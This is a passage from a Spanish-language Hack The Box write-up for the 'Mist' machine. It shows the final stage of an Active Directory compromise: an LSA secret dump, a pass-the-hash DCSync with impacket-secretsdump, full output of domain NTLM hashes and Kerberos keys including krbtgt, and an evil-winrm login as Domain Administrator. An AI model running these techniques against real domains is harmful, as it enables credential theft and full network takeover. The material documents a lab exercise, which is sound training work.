 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.
 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&....
 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.
 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..'1
NL$KM:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731
[*] Cleaning up...
```

Con el hash NTLM de DC01$ en nuestro poder, se ejecutó un ataque DCSync, solicitando directamente
los secretos del dominio y obteniendo el hash NTLM del Domain Administrator. Este paso consolidó el
control total sobre la infraestructura de Active Directory.

```text
┌──(usuario㉿kali)-[~/HTB/mist/content]
└─$ proxychains4 -q impacket-secretsdump DC01\$@dc01.mist.htb -hashes :e768c4cf883a87ba9e96278990292260
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
MS01$:1108:aad3b435b51404eeaad3b435b51404ee:fb3b628ebb845864ac71e7839f465987:::
svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:34e8dda92bbbf6b5a4c4605e4931fa25:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:223c1b3a34e024798181df5812ff08617c8a874473002ca892f5f3312a0367d2
Administrator:aes128-cts-hmac-sha1-96:98610a32239f909d2dd7191a0b200af3
Administrator:des-cbc-md5:89e007fbc8197319
krbtgt:aes256-cts-hmac-sha1-96:1f8d633a6aca948f3cfe1ae103ef2245825dc2f16ed171823ac817c097aea0f1
krbtgt:aes128-cts-hmac-sha1-96:d746342824512200d29d504b040e150b
krbtgt:des-cbc-md5:4923193b1c981332
Sharon.Mullard:aes256-cts-hmac-sha1-96:46f1b3a696d5ce7194654e1ee205e05e5fc40fc6726232494d50172697404f59
Sharon.Mullard:aes128-cts-hmac-sha1-96:ce1d4f67122df39096a0304087a37af9
Sharon.Mullard:des-cbc-md5:1a7f4054163d7580
Brandon.Keywarp:aes256-cts-hmac-sha1-96:5b6d15db9b7d5a87e6fab031a46dc560df979523edf72109a33dbee4c9023e2a
Brandon.Keywarp:aes128-cts-hmac-sha1-96:c94f80b1f0f52971bc210cb7fa08e548
Brandon.Keywarp:des-cbc-md5:80757608c7fef2ec
Florence.Brown:aes256-cts-hmac-sha1-96:30edaa3ce504213f32a4ea4b4ee209788bc022d2702f45e512b8d552b530d9f3
Florence.Brown:aes128-cts-hmac-sha1-96:68085dd2a95d4ead421af52312472061
Florence.Brown:des-cbc-md5:ce7508bc0e7998ab
Jonathan.Clinton:aes256-cts-hmac-sha1-96:ac2f7bfaee93c245ebbd9959fa420c32b1d69780560c8a23c605eb47e5d6cc46
Jonathan.Clinton:aes128-cts-hmac-sha1-96:467238a4a231a28930e412d27ed8b09a
Jonathan.Clinton:des-cbc-md5:087c674fcdf1bf8f
Markus.Roheb:aes256-cts-hmac-sha1-96:48553e83896443f93aa77b0f280407f02d0a13da45c2c39598fb0fa298c17043
Markus.Roheb:aes128-cts-hmac-sha1-96:e48c992fe7678056ac85e0fe169c02c5
Markus.Roheb:des-cbc-md5:7940c4c8259b1af7
Shivangi.Sumpta:aes256-cts-hmac-sha1-96:4b6f0e6c634bdc4dad3b91b42fec80135c5520f49aa7f7d541d27aacfce21d89
Shivangi.Sumpta:aes128-cts-hmac-sha1-96:25fba62098625aecfe9f335aa71a01cb
Shivangi.Sumpta:des-cbc-md5:c24fa21ccb91aba1
Harry.Beaucorn:aes256-cts-hmac-sha1-96:f85edbb56f68155fb8b45360ba2e67cbe67893c8875d7ae1ea2a54085f082a73
Harry.Beaucorn:aes128-cts-hmac-sha1-96:e21bf6bd700e77fdea81121431629f4c
Harry.Beaucorn:des-cbc-md5:ab7c137ad364e66e
op_Sharon.Mullard:aes256-cts-hmac-sha1-96:14457283d779320d1bf9e003ee084c9f70d8fec7324345ac15d16241c512299f
op_Sharon.Mullard:aes128-cts-hmac-sha1-96:c439ce69fb34c7b2c693cd11dabd2488
op_Sharon.Mullard:des-cbc-md5:8cc158f8527585ba
op_Markus.Roheb:aes256-cts-hmac-sha1-96:630b8034289cce271b529607039bff05635578b555f055e15398e90665a3a91b
op_Markus.Roheb:aes128-cts-hmac-sha1-96:48f2924abb1cdbe2b029a679b9f95e2c
op_Markus.Roheb:des-cbc-md5:3876f7baa1e97932
svc_smb:aes256-cts-hmac-sha1-96:ab6fd9c7fb1497cd70e54fbe3e763cfac26fa660ceee14492736c6c183b74e37
svc_smb:aes128-cts-hmac-sha1-96:a8626be32fc03eff20e28b11101cd262
svc_smb:des-cbc-md5:b0f8bfb5e6ea0431
svc_cabackup:aes256-cts-hmac-sha1-96:7bb6d62ae4d9438ed967ac87ebe16c00ed8eec1d2ef6979288ad16a0ef9d1dd4
svc_cabackup:aes128-cts-hmac-sha1-96:f85ae26f1f4f33686293221872fef92a
svc_cabackup:des-cbc-md5:4a7504e5341910df
DC01$:aes256-cts-hmac-sha1-96:a47600b1ff206958b49938fdff101d4444253de01f595c7fe1a5276e4265c245
DC01$:aes128-cts-hmac-sha1-96:7043bf9b8bf4e5886058da7defab4581
DC01$:des-cbc-md5:07fef70d97161502
MS01$:aes256-cts-hmac-sha1-96:8f82e90633f5cd95da4d50f1c8c573a13377bffb3d1b0f85c810b71fab829553
MS01$:aes128-cts-hmac-sha1-96:429030f2cb71f91150547d8b8717cedc
MS01$:des-cbc-md5:76a40b38ce6e9776
svc_ca$:aes256-cts-hmac-sha1-96:e811f438d10d4d18fd710f7712cde1e72d62c77e1d8e14d66251da48730454a5
svc_ca$:aes128-cts-hmac-sha1-96:e9cbb36659c97cfdd00aae26d669fc5d
svc_ca$:des-cbc-md5:b3439497cef2f82c
[*] Cleaning up...
```

Finalmente, utilizando evil-winrm, se estableció una sesión interactiva como Domain Administrator, lo
que permitió acceder al controlador de dominio y recuperar la flag root.txt, completando así el compromiso
integral del entorno.

<img src="assets/64.png">

